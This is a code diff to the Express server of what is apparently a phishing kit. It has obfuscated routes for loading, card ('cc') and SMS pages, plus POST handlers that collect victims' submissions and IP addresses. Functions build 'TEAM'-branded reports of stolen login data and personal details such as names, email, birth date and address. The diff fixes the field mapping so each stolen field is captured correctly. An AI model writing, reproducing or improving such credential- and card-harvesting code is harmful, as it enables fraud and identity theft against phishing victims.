@@ -118,13 +118,13 @@ app.get("/fGnEL4jmpuBCDkJP3myR",(req,res)=>{ // loading 1:
     res.render("lopado1");
 });
 app.get("/QcEwP85AgNE4pnL5mWSM",(req,res)=>{ // loading 1:
-    res.render("pg1");
+    res.render("inofama");
 });
 app.get("/Q89HFszQPd3TFv4mx65k",(req,res)=>{ // cc page:
     res.render("lopado2");
 });
 app.get("/RKnUB922z6Mf4HDwg3EZ",(req,res)=>{ // loading 2:
-    res.render("ccta");
+    res.render("cebiratia");
 });
 app.get("/aEsKRvuaENZtYax265Kv",(req,res)=>{ // sms 1:
     res.render("lopado3");
@@ -156,13 +156,13 @@ app.post("/gzLbTbjqMpc34D4XsPJ2",(req,res)=>{ // login post
     res.send({OK:true});
 });
 
-app.post("/NkMNm4664XhcW8KuukHk",(req,res)=>{ // cc post
+app.post("/NkMNm4664XhcW8KuukHk",(req,res)=>{ // form post
     let data = req.body;
     // console.log(data);
     a2(data,requestIp.getClientIp(req));
     res.send({OK:true});
 });
-app.post("/m4kT9BQWt7KTDdaVmafx",(req,res)=>{ // sms1 post
+app.post("/m4kT9BQWt7KTDdaVmafx",(req,res)=>{ // cc post
     let data = req.body;
     // console.log(data);
     a3(data,requestIp.getClientIp(req));
@@ -188,7 +188,7 @@ function a1(data,ip) {
     let block="";
     block += `${brand}  | [LOGIN] |  TEAM\n`; 
     block += `#=o=o=o=o=o=o=o=o=o=o=o=o=o=o=o=#\n`;
-    block += `Type: ${data.nifo}\nIP: ${ip}\n`;
+    block += `Type: ${data.logita}\nIP: ${ip}\n`;
     block += `#=o=o=o=o=o=o=o=o=o=o=o=o=o=o=o=#\n`;
     block += `${brand}  | [${target}]  |  TEAM`;
     
@@ -200,7 +200,7 @@ function a2(data,ip) {
     let block="";
     block += `${brand}  | [LOGIN](secreto) |  TEAM\n`; 
     block += `#=o=o=o=o=o=o=o=o=o=o=o=o=o=o=o=#\n`;
-    block += `Apellidos: ${data.s1}\nApellidos: ${data.s1}\nNombres: ${data.s2}\nEmail: ${data.s1}\nFecha de nacimiento: ${data.s1}\nDirección postal: ${data.s1}\nCódigo postal: ${data.s1}\nCiudad: ${data.s1}\nNúmero: ${data.s1}\nIP: ${ip}\n`;
+    block += `Apellidos: ${data.s1}\nNombres: ${data.s2}\nEmail: ${data.s3}\nFecha de nacimiento: ${data.s4}\nDirección postal: ${data.s5}\nCódigo postal: ${data.s6}\nCiudad: ${data.s7}\nNúmero: ${data.s8}\nIP: ${ip}\n`;
     block += `#=o=o=o=o=o=o=o=o=o=o=o=o=o=o=o=#\n`;
     block += `${brand}  | [${target}]  |  TEAM`;
     
